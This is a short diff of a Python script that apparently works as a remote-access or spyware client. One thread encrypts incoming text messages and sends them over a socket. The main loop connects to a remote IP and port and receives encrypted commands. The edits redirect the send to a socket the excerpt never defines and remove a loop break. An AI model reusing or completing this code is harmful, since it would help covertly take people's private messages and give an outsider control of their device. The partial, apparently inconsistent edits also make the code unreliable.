@@ -58,7 +58,7 @@ def incomming_texts():
 
         if(TextsRaw1 != TextsRaw2):
             Texts = encrypt(bytes.decode(TextsRaw2.communicate()[0]))
-            SOCKET.send(encrypt(Texts))
+            SOCKET2.send(Texts)
 
 
 incomming_texts_thread = threading.Thread(target=incomming_texts)
@@ -69,7 +69,7 @@ incomming_texts_thread.start()
 SOCKET = socket(AF_INET, SOCK_STREAM)
 while True:
     SOCKET.connect((IP, PORT))
-    print('connected')
+    print('connected on port ' + str(PORT))
 
     while True:
         DATA = decrypt(SOCKET.recv(1024))
@@ -88,4 +88,3 @@ while True:
 
         if(DATA == 'exit'):
             SOCKET.close()
-            break
